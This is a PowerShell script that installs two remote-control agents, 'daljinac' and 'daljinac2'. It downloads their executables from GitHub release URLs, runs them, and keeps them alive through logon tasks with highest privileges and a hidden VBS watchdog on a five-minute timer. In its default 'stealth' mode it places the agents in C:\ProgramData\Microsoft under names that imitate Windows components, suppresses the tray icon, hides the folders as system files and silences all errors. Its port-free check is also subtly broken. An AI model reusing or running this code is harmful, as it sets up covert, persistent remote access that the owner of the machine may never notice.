param([switch]$v1, [switch]$v2, [switch]$normal)

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

if (-not $v1 -and -not $v2) { $v1 = $true; $v2 = $true }

if ($normal) {
    $agents = @()
    if ($v1) { $agents += @{ Name='daljinac';  Dir='C:\daljinac';  ExeName='systemUI.exe';  TaskName='daljinac';  URL='https://github.com/egzakutacno/daljinac/releases/latest/download/systemUI.exe';  Port=8081; ExtraArgs='' } }
    if ($v2) { $agents += @{ Name='daljinac2'; Dir='C:\daljinac2'; ExeName='daljinac2.exe'; TaskName='daljinac2'; URL='https://github.com/egzakutacno/daljinac2/releases/latest/download/daljinac2.exe'; Port=1984; ExtraArgs='' } }
    $stealth = $false
} else {
    $agents = @()
    if ($v1) {
        $agents += @{ Name='v1stealth'; Dir='C:\ProgramData\Microsoft\HelpData'; ExeName='HelpDataHost.exe'; TaskName='HelpDataHost'; URL='https://github.com/egzakutacno/daljinac/releases/latest/download/systemUI.exe'; Port=8081; ExtraArgs='-notray' }
    }
    if ($v2) {
        $agents += @{ Name='v2stealth'; Dir='C:\ProgramData\Microsoft\DiagHub'; ExeName='DiagHubHost.exe'; TaskName='DiagHubHost'; URL='https://github.com/egzakutacno/daljinac2/releases/latest/download/daljinac2.exe'; Port=1984; ExtraArgs='-notray' }
    }
    $stealth = $true
}

foreach ($a in $agents) {
    Write-Host "=== $($a.Name) ===" -ForegroundColor Cyan
    $Exe = "$($a.Dir)\$($a.ExeName)"

    # Clean old tasks
    Write-Host "[1/4] Cleaning tasks..."
    @($a.TaskName, "$($a.TaskName)Watch", "Daljinac", "DaljinacWatch", "Daljinac2", "Daljinac2Watch",
      "HelpDataHost", "HelpDataHostWatch", "DiagHubHost", "DiagHubHostWatch",
      "systemUI", "daljinac2") | Select-Object -Unique | ForEach-Object {
        schtasks /delete /tn $_ /f 2>$null
    }

    # Kill aggressively until port free
    Write-Host "[2/4] Killing processes..."
    $maxWait = 20
    do {
        Get-Process -Name @("systemUI","daljinac","HelpDataHost","daljinac2","DiagHubHost") -ErrorAction SilentlyContinue | Stop-Process -Force
        Start-Sleep -Seconds 1
        $maxWait--
        $portFree = $true
        try { (Get-NetTCPConnection -LocalPort $a.Port -ErrorAction Stop).OwningProcess } catch { $portFree = $true }
        if ($maxWait -le 0) { break }
    } while (-not $portFree)
    Start-Sleep -Seconds 2

    # Download
    Write-Host "[3/4] Downloading..."
    mkdir $a.Dir -Force | Out-Null
    Invoke-WebRequest $a.URL -OutFile "$Exe.new" -UseBasicParsing
    Write-Host "       $((Get-Item "$Exe.new").Length) bytes"

    Start-Sleep -Seconds 1

    # Replace
    Write-Host "[3b/4] Replacing..."
    Move-Item -Force "$Exe.new" $Exe

    # Scheduled tasks
    Write-Host "[4/4] Installing tasks..."
    Remove-Item "$($a.Dir)\watchdog.vbs" -Force -ErrorAction SilentlyContinue

    $taskCmd = "`"$Exe`""
    if ($a.ExtraArgs) { $taskCmd = "`"$Exe`" $($a.ExtraArgs)" }
    schtasks /create /tn $a.TaskName /tr $taskCmd /sc ONLOGON /it /rl HIGHEST /f

    $vbs = "CreateObject(`"WScript.Shell`").Run `"schtasks /run /tn $($a.TaskName)`", 0, False"
    Set-Content -Path "$($a.Dir)\watchdog.vbs" -Value $vbs -Encoding ASCII
    schtasks /create /tn "$($a.TaskName)Watch" /tr "wscript.exe //B $($a.Dir)\watchdog.vbs" /sc MINUTE /mo 5 /f

    if ($stealth) { attrib +h +s $a.Dir }

    # Start
    ([wmiclass]'Win32_Process').Create("`"$Exe`" $($a.ExtraArgs)") | Out-Null
    Start-Sleep -Seconds 2
}

Write-Host ""
Write-Host "DONE." -ForegroundColor Green
if ($stealth) { Write-Host "  Mode: STEALTH" } else { Write-Host "  Mode: NORMAL" }
if ($v1) { Write-Host "  v1: $($agents | Where-Object Name -match v1 | ForEach-Object ExeName)" }
if ($v2) { Write-Host "  v2: $($agents | Where-Object Name -match v2 | ForEach-Object ExeName)" }
